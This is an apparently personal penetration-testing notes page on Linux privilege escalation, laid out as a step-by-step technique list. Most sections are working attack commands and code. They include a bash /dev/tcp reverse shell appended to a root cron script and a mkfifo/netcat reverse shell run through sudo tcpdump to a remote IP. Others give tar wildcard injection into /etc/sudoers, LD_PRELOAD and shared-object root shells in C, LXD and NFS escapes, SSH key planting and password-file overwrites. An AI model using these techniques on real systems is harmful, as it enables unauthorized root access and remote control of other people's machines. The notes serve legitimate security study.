---
title: Notes | Linux Privilege Escalation
author: Zeropio
date: 2022-07-28
categories: [Notes, System]
tags: [privilage-escalation, linux]
permalink: /notes/system/linux-privilege-escalation
---

> Check the [Hacktricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) checklist!
{: .prompt-tip }

---

# Enumeration

Enumeration is the fundamental part for Privilege Escalation. We need the following information:
- **OS Version**
- **Kernel Version**
- **Running Services**
- **Installed Packages and Versions**
- **Logged in Users**
- **User Home Directories**
- **Sudo Privileges**
- ...

There are some useful tools like:
- [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
- [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

---

# Kernel Exploits 

Kernel level exploits exist for a variety of Linux kernel versions, for example [DirtyCow](https://github.com/dirtycow/dirtycow.github.io).

First, start checking the Linux OS Version:
```console
zero@pio$ uname -a 
zero@pio$ cat /etc/lsb-release
```

Search the OS Version on Internet to find exploits.

---

# Vulnerable Services

Using the previous step, identify the programs on the target system. Check their version, usually with the flag `-v` and search on Internet for exploits. Also we can run `dpkg -l` to a fast check.

---

# Cron Job Abuse

The `crontab` command can create a cron file in:
- `/etc/crontab`{: .filepath}
- `/etc/cron.d`{: .filepath}
- `/var/spool/cron/crontabs/root`{: .filepath}
- `/var/spool/cron`{: .filepath}. 

Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs. Certain applications create cron files in the `/etc/cron.d`{: .filepath} directory and may be misconfigured to allow a non-root user to edit them.

Let's look around the system for any writeable files or directories:
```console
zero@pio$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Move to suspicious folders and inspect them:
```console
zero@pio$ ls -la ./suspicious/
```

If editing a script, make sure to **ALWAYS** take a copy of the script and/or create a backup of it. To append a reverse shell we can a simply line to a script as:
```bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

Open a netcat listener and wait to connect. There are other ways. If in the `/etc/crontab`{: .filepath} we have the PATH with the `/home/user`{: .filepath} we can create the following script in the home:
```console
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

We need to give execution permission and wait to the crontab to execute the file. Then do
```console
$ /tmp/rootbash -p
```

--- 

# Special Permissions 

## Setuid Bit

The **Set User ID upon Execution** (**setuid**) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an `s`.
```console
zero@pio$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. The **Set-Group-ID** (**setgid**) permission is another special permission that allows us to run binaries as if we were part of the group that created them.
```console
zero@pio$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

## GTFOBins 

This [project](https://gtfobins.github.io/) provides us a wide range of escalation privileges for Unix binaries. For example:
```console
zero@pio$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

# Sudo Right Abuse 

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the **sudo** command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`{: .filepath}. The first thing to do is running the following command:
```console
zero@pio$ sudo -l
```

This will list all the privileges of our current user. If we see the option `NOPASSWD`, we can run the path next to it with other user privileges. Take for example we could run **tcpdump** with root privileges. We can start our privilage escalation:
```console
zero@pio$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root 
zero@pio$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

zero@pio$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

In a netcat we will receive the shell.

---

# Path Abuse 

**PATH** is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example running `cat` instead of `/bin/cat`. We can check it with `echo $PATH`. Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. To modify the PATH.
```console
zero@pio$ PATH=.:${PATH}
zero@pio$ export PATH
```

Now, we can create a easy script:
```console
zero@pio$ echo 'echo "PATH ABUSE!!"' > ls 
zero@pio$ chmod +x ls 
zero@pio$ ls

PATH ABUSE!!
```

---

# Wildcard Abuse 

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include: 

| **Character**   | **Significance**    |
|--------------- | --------------- |
| `*` | An asterisk that can match any number of characters in a file name |
| `?` | Matches a single character |
| `[ ]` | Brackets enclose characters and can match any single one at the defined position |
| `~` | user home directory or can have another username appended to refer to that user's home director |
| `-` | A hyphen within brackets will denote a range of characters |

Let's see an example with the command `tar`. We will use the following tar flag:
```console
zero@pio$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

With a cronjob that make automatically backup copy from the `/root`{: .filepath} to `/tmp`{: .filepath}. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify:
```console
zero@pio$ echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
zero@pio$ echo "" > "--checkpoint-action=exec=sh root.sh" 
zero@pio$ echo "" > --checkpoint=1
```

Check that the files are created:
```console
zero@pio$ ls -al 

-rw-rw-r--  1 user user    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 user user    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
```

Once the cronjob run:
```console
zero@pio$ sudo -l 

...
User zero may run the following commands on pio:
    (root) NOPASSWD: ALL
```

---

# Credential Hunting 

## Searching for Creds 

These may be found in configuration files (**.conf**, **.config**, **.xml**, etc.), shell scripts, a user's bash history file, backup (**.bak**) files, within database files or even in text files. Don't forget about **Password Reuse**. One example for SQL credentials:
```console
zero@pio$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

We can search for config files:
```console
zero@pio$ find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## SSH Keys 

Always check for SSH keys:
```console
zero@pio$ ls ~/.ssh
```

To connect using the RSA:
```console
zero@pio$ chmod 600 id_rsa
zero@pio$ ssh user@<ip> -i id_rsa
```

If we can write in the `/.ssh/`{: .filepath} we can write our public key inside the target machine, at `/home/user/.ssh/authorized_keys`{: .filepath}. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user.
First, create a new key. Copy the `key.pub` inside `/root/.ssh/authorized_keys`{: .filepath}:
```console
zero@pio$ ssh-keygen -f keys

victim@machine$ echo "ssh-rsa AAAAB...SNIP...M= user@zeropio" >> /root/.ssh/authorized_keys

zero@pio$ ssh root@10.10.10.10 -i key
root@remotehost$ 
```

---

# Shared Libraries 

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. There are two types on Linux **static libraries** (with the extension `.a`) and **dynamically linked shared object libraries** (with the extension `.so`). Dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables **LD_RUN_PATH** or **LD_LIBRARY_PATH**, placing libraries in the `/lib`{: .filepath} or `/usr/lib`{: .filepath} default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf`{: .filepath} configuration file. Additionally, the **LD_PRELOAD** environment variable can load a library before executing a binary. The shared objects required by a binary can be viewed using the `ldd` utility:
```console
zero@pio$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

## LD\_PRELOAD Privilege Escalation 

First, we need a user with sudo privileges.
```console
zero@pio$ sudo -l 

...
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

We can exploit the **LD_PRELOAD** issue to run a custom shared library file. Let's compile the following library:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Compile:
```console
zero@pio$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Now we can escalate privileges:
```console
zero@pio$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart 

id
uid=0(root) gid=0(root) groups=0(root)
```

---

# Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary:
```console
zero@pio$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Check their libraries:
```console
zero@pio$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

We see the non-standard library `libshared.so`. One such setting is the **RUNPATH** configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility:
```console
zero@pio$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

We can see their location. Before compiling a library, we need to find the function name called by the binary.
```console
zero@pio$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so 
zero@pio$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000) 

zero@pio$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function:
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

Now compile and execute:
```console
zero@pio$ cc src.c -fPIC -shared -o /development/libshared.so 
zero@pio$ ./payroll 

# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

---

# Privileged Groups 

## LXC / LXD 

**LXD** is similar to Docker and is Ubuntu's container manager. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`{: .filepath}. Let's confirm group membership and use these rights to escalate to root:
```console
zero@pio$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image:
```console
zero@pio$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Start the **LXD**:
```console
zero@pio$ lxd init
```

Import the local image:
```console
zero@pio$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged container with the `security.privileged` set to `true `:
```console
zero@pio$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Mount the host file system:
```console
zero@pio$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

And start:
```console
zero@pio$ lxc start r00t 
zero@pio:~/64-bit Alpine$ lxc exec r00t /bin/sh 

# id 
uid=0(root) gid=0(root)
```

## Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. For example `docker run -v /root:/mnt -it ubuntu`.

## Disk 

Users within the disk group have full access to any devices contained within `/dev`{: .filepath}, such as `/dev/sda1`{: .filepath}, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.

## ADM 

Members of the adm group are able to read all logs stored in /var/log. Check it with:
```console
zero@pio$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

---

# Miscellaneous Techniques 

## Passive Traffic Capture 

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Some tools like [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) can be used to examine data being passed on the wire.

## Weak NFS Privileges 

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems.NFS uses TCP/UDP **port 2049**:
```console
zero@pio$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

When an NFS volume is created, various options can be set:

| **Option**   | **Description**    |
|--------------- | --------------- |
| `root_squash` | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set. |

```console
zero@pio$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

```c
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

Compile:
```console
zero@pio$ gcc shell.c -o shell 
zero@pio$ sudo mount -t nfs 10.129.2.12:/tmp /mnt 
zero@pio$ cp shell /mnt 
zero@pio$ chmod u+s /mnt/shell 
zero@pio$ /tmp/shell 

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Hijacking Tmux Sessions 

When not working in a tmux window, we can detach from the session, still leaving it active. For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked:
```console
zero@pio$ tmux -S /shareds new -s debugsess 
zero@pio$ chown root:devs /shareds
```

If we can compromise a user in the dev group, we can attach to this session and gain root access. Check for any running tmux processes:
```console
zero@pio$ ps aux | grep tmux 
```

Check permissions:
```console
zero@pio$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Review our group membership:
```console
zero@pio$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finally, attach to the tmux session:
```console
zero@pio$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

---

# Files

## /etc/shadow
If we can read the file **/etc/shadow** we can try to break the hashes with **john**:
```console
zero@pio$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

If **/etc/shadow** is writeable we can change the passwords. First we need to generate one:
```console
zero@pio$ mkpasswd -m -sha-512 [password]
```
And then replace the hash.

## /etc/passwd
If we can write in **/etc/passwd** we can change the password:
```console
zero@pio$ openssl passwd [password]
```

Then we replace the **x** in the same line as the root with the hash, now we can log as root.




















